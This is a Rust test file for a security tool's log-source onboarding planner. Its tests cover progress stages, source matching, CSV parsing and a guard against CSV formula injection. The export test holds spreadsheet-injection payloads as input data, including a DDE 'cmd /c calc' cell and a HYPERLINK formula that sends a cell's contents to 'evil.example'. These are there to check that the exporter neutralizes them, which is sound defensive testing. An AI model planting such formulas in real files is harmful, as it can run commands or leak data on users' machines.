// SPDX-License-Identifier: AGPL-3.0-or-later
use super::*;
fn row() -> PlannedSource {
    PlannedSource {
        id: Uuid::new_v4(),
        name: "Firewall".into(),
        vendor: "Palo Alto".into(),
        expected_type: Some("pan_os".into()),
        wave_id: None,
        priority: 2,
        owner: String::new(),
        target: None,
        notes: String::new(),
        linked_log_source_id: None,
        dismissed_log_source_ids: vec![],
        completed: false,
        completed_at: None,
        completed_by: None,
    }
}
fn healthy() -> LiveSignals {
    LiveSignals {
        eps: Some(100.0),
        last_event_at: Some(Utc::now()),
        parse_success_pct: Some(99.9),
        refused24h: Some(1),
        rules_using: 1,
        status: "healthy".into(),
    }
}
#[test]
fn every_stage_and_completion_visibility() {
    let now = Utc::now();
    let mut p = row();
    let mut l = healthy();
    assert_eq!(progress(&p, None, false, None, now).stage, "Not connected");
    assert_eq!(progress(&p, None, true, None, now).stage, "Match suggested");
    assert_eq!(
        progress(&p, Some(&l), false, None, now).stage,
        "Ready to complete"
    );
    l.rules_using = 0;
    assert_eq!(
        progress(&p, Some(&l), false, None, now).stage,
        "No detections use it"
    );
    l.rules_using = 1;
    l.status = "paused".into();
    assert_eq!(
        progress(&p, Some(&l), false, None, now).stage,
        "In progress"
    );
    l.status = "lagging".into();
    assert_eq!(progress(&p, Some(&l), false, None, now).stage, "Lagging");
    l.parse_success_pct = Some(98.9);
    assert_eq!(
        progress(&p, Some(&l), false, None, now).stage,
        "Refusing events"
    );
    l.last_event_at = Some(now - chrono::Duration::minutes(15));
    assert_eq!(
        progress(&p, Some(&l), false, None, now).stage,
        "Quiet for 15m"
    );
    p.completed = true;
    assert_eq!(
        progress(&p, Some(&l), false, None, now).stage,
        "Regressed since complete"
    );
    l = healthy();
    let e = progress(&p, Some(&l), false, None, now);
    assert_eq!(e.stage, "Complete");
    assert!(!e.ready && !e.issue);
}
#[test]
fn unknown_is_never_one_hundred_percent() {
    let mut l = healthy();
    l.parse_success_pct = None;
    let e = progress(&row(), Some(&l), false, None, Utc::now());
    assert!(!e.c3 && !e.ready && !e.parsing_known);
    assert_eq!(e.stage, "Parsing unknown");
}
#[test]
fn row_target_overrides_wave_target() {
    let mut p = row();
    let now = Utc::now();
    let yesterday = now.date_naive() - chrono::Duration::days(1);
    assert!(progress(&p, None, false, Some(yesterday), now).late);
    p.target = Some(now.date_naive());
    assert!(!progress(&p, None, false, Some(yesterday), now).late);
}
#[test]
fn match_is_explicit_deterministic_and_excludes_linked_or_dismissed() {
    let c = MatchCandidate {
        id: Uuid::new_v4(),
        name: "Palo Alto firewall".into(),
        source_type: "pan_os".into(),
    };
    let s = suggest(
        "Firewall",
        "Palo Alto",
        Some("pan_os"),
        &[c.clone()],
        &BTreeSet::new(),
    )
    .unwrap();
    assert!(s.type_match && s.confidence > 0.0);
    assert!(suggest(
        "Firewall",
        "Palo Alto",
        None,
        &[c.clone()],
        &BTreeSet::from([c.id])
    )
    .is_none());
    assert!(suggest(
        "the logs and app",
        "",
        Some("pan_os"),
        &[c],
        &BTreeSet::new()
    )
    .is_none());
}
#[test]
fn csv_optional_headers_quotes_wave_rules_dates_and_duplicates() {
    let w = Wave {
        id: Uuid::new_v4(),
        name: "Identity — first".into(),
        target: None,
        order: 0,
    };
    let r=csv::parse("name,vendor,wave,priority,owner,target,status\n\"Firewall, west\",Palo Alto,identity,9,alice,2026-02-30,complete\nFirewall,Other,Wave 1,1,bob,2026-10-12,ready\nfirewall,Other,New wave,3,,,",&[w.clone()],&[]).unwrap();
    assert_eq!(r[0].name, "Firewall, west");
    assert_eq!(r[0].wave_id, Some(w.id));
    assert_eq!(r[0].priority, 2);
    assert!(r[0].target.is_none());
    assert_eq!(r[1].wave_id, Some(w.id));
    assert!(r[2].duplicate && r[2].new_wave);
    assert_eq!(
        csv::parse("source,vendor,,3,owner,2026-10-12", &[], &[]).unwrap()[0].priority,
        3
    );
}

fn joined(sources: Vec<PlannedSource>, waves: Vec<Wave>) -> service::JoinedPlan {
    service::SourceOnboardingService::join(
        repository::Plan {
            waves,
            sources,
            settings: Default::default(),
        },
        vec![],
        &[],
    )
}

#[test]
fn export_neutralizes_spreadsheet_formulas_in_every_user_cell() {
    let wave = Wave {
        id: Uuid::new_v4(),
        name: "=HYPERLINK(\"https://evil.example/?\"&A1,\"wave\")".into(),
        target: None,
        order: 0,
    };
    let mut p = row();
    p.name = "=cmd|' /c calc'!A0".into();
    p.vendor = "@SUM(1+9)*cmd".into();
    p.owner = "+1+1".into();
    p.notes = " =1+1".into();
    p.expected_type = Some("\t=1+1".into());
    p.wave_id = Some(wave.id);
    let out = service::export(&joined(vec![p], vec![wave])).unwrap();
    let mut reader = ::csv::ReaderBuilder::new().from_reader(out.as_bytes());
    let record = reader.records().next().unwrap().unwrap();
    for cell in record.iter() {
        assert!(
            !cell.trim_start().starts_with(['=', '+', '-', '@', '\t', '\r']),
            "raw formula cell {cell:?} in {out:?}"
        );
    }
    assert_eq!(&record[0], "'=cmd|' /c calc'!A0");
    assert_eq!(&record[1], "'@SUM(1+9)*cmd");
    assert!(record[2].starts_with("'=HYPERLINK("));
    assert_eq!(&record[3], "2", "numbers stay numeric");
    assert_eq!(&record[4], "'+1+1");
    assert_eq!(&record[6], "' =1+1");
    assert_eq!(&record[7], "'\t=1+1");
}

#[test]
fn import_export_import_round_trips_without_accumulating_guards() {
    let wave = Wave {
        id: Uuid::new_v4(),
        name: "=wave".into(),
        target: None,
        order: 0,
    };
    let mut p = row();
    p.name = "=HYPERLINK(\"x\")".into();
    p.vendor = "'=already quoted".into();
    p.owner = "-cmd".into();
    p.notes = "plain, with comma".into();
    p.wave_id = Some(wave.id);
    let first = service::export(&joined(vec![p.clone()], vec![wave.clone()])).unwrap();
    let rows = csv::parse(&first, &[wave.clone()], &[]).unwrap();
    assert_eq!(rows[0].name, p.name);
    assert_eq!(rows[0].vendor, p.vendor);
    assert_eq!(rows[0].owner, p.owner);
    assert_eq!(rows[0].notes, p.notes);
    assert_eq!(rows[0].wave.as_deref(), Some("=wave"));
    assert_eq!(rows[0].wave_id, Some(wave.id));
    // Re-plan from the import and export again: byte-identical, no `''=` growth.
    let mut q = p.clone();
    q.name = rows[0].name.clone();
    q.vendor = rows[0].vendor.clone();
    q.owner = rows[0].owner.clone();
    q.notes = rows[0].notes.clone();
    let second = service::export(&joined(vec![q], vec![wave])).unwrap();
    assert_eq!(first, second);
    // A value that literally starts with `'=` gets exactly one more guard.
    assert!(
        second.contains(",''=already quoted,") && !second.contains("'''"),
        "{second}"
    );
}

#[test]
fn import_keeps_literal_leading_quotes_that_are_not_guards() {
    let rows = csv::parse("name,vendor,owner\n'hello,'-5,'=x", &[], &[]).unwrap();
    assert_eq!(rows[0].name, "'hello");
    assert_eq!(rows[0].vendor, "'-5");
    assert_eq!(rows[0].owner, "=x");
}

#[test]
fn refusal_capable_counters_are_required_for_parse_success() {
    use super::service::admission_parse_success_pct as pct;
    assert_eq!(pct(100, 0, None), None);
    assert_eq!(pct(0, 0, Some(0)), None);
    assert_eq!(pct(99, 0, Some(1)), Some(99.0));
    assert_eq!(pct(100, 1, Some(0)), Some(99.0));
    assert_eq!(pct(0, 0, Some(100)), Some(0.0));
    assert_eq!(pct(10, 11, Some(0)), None);
}
